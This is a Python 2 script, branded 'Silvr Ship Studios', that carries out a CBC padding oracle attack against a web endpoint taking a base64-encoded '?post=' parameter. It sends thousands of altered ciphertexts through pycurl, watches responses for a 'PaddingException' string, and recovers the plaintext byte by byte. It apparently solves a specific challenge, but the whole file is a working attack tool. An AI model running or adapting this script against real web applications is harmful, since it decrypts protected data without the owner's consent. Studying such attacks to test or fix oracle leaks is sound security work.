#!/usr/bin/python

import pycurl
from StringIO import StringIO
import base64
import sys
import time

def main(args):
    if not len(args)>1:
        print('No url')
        return

    # Parse given url to the domain and encrypted data
    target=args[1]
    if target.find('?post=')==-1:
        print('No post in url')
        return


    domain=target[0:target.find('?post=')+6]
    post=target[target.find('?post=')+6:]
    #post='ZvVJVo!Zpuib0UAq2sCICaxLAE7CgsUZqssWyNgyuzWoE6LfBESoAgKwBx3GC5YhlHGgvmhcTpurQIU21mvn8HL!j0ppFC5ahEg88tFo6BvjLfhzzqsjAWIaB0ui1wsb'

    decoded=post.replace('!','/').replace('-','+').replace('~','=').decode('base64')

    size=len(decoded)
    blocks=size/16

    decrypted=bytearray(len(decoded))
    plaintext=bytearray(len(decoded))

    requests=0
    startTime=time.time()

    c=pycurl.Curl()

    print('\n\nStarting Padding Oracle Attack \
         \nSilvr Ship Studios\
         \n  Domain: '+domain+
        '\n  '+str(blocks)+' Blocks [Size 16]')

    print('Decyrpting [0 / '+str(size-16)+']')
    print('## '* (size-16))

    last_plain_byte=0
    for block in range(blocks-1,0,-1):   # By block
        rel_enc = decoded[0:(block+1)*16]

        for byte in range(15,-1,-1):    # iterate over bytes in block

            tar_byte= (block*16)+byte
            rel_byte= tar_byte%16
            compl= tar_byte-16


            for d in range(0,256):
                d_opt= d ^ (ord(decoded[compl])) ^ last_plain_byte ^ (16-byte)


                resultBuff= StringIO()
                c.setopt(c.WRITEDATA, resultBuff)

                hash_dec=rel_enc[0:compl] + chr(d_opt)

                for alt in range(1, 16-byte):
                    hash_dec+= chr(  (  decrypted[tar_byte+alt]  ^  (16-byte)  )  )  # Decrypted with offset

                hash_dec+= rel_enc[compl+(16-byte):]

                b64enc=base64.b64encode(hash_dec).replace('/','!').replace('+','-').replace('=','~')
                url=domain+b64enc

                c.setopt(c.URL,url)
                c.perform()
                requests+=1

                result=resultBuff.getvalue()

                if (byte==15 and result.find("PaddingException")==-1):  # Last byte in block; check twice
                    verify_dec=hash_dec[0:compl-1]+chr(0)+hash_dec[compl:]
                    verify64=base64.b64encode(verify_dec).replace('/','!').replace('+','-').replace('=','~')
                    url=domain+verify64

                    c.setopt(c.URL,url)
                    c.perform()

                    requests+=1
                    result=resultBuff.getvalue()

                if (result.find("PaddingException")==-1):   # Byte found
                    
                    dec_byte = d_opt^(16-byte)

                    plain_byte = dec_byte ^ ord(decoded[compl])
                    last_plain_byte = plain_byte

                    decrypted[tar_byte]=dec_byte
                    plaintext[tar_byte]=plain_byte
                    break

            # After finding byte
            # Display
            print('\n'*3)
            print('Decyrpting ['+str(size-tar_byte)+' / '+str(size-16)+']')
            print('## '* (tar_byte-16)), ' '.join('{:02x}'.format(x) for x in plaintext[tar_byte:])

    print('Attack Complete')
    print('Result:')
    print('  Plaintext: '+plaintext[16:size-(plaintext[size-1])]+'\n')

    print('Time taken: '+str(time.time()-startTime))
    print('Requests made: '+str(requests))
    







if __name__ == '__main__':
    main(sys.argv)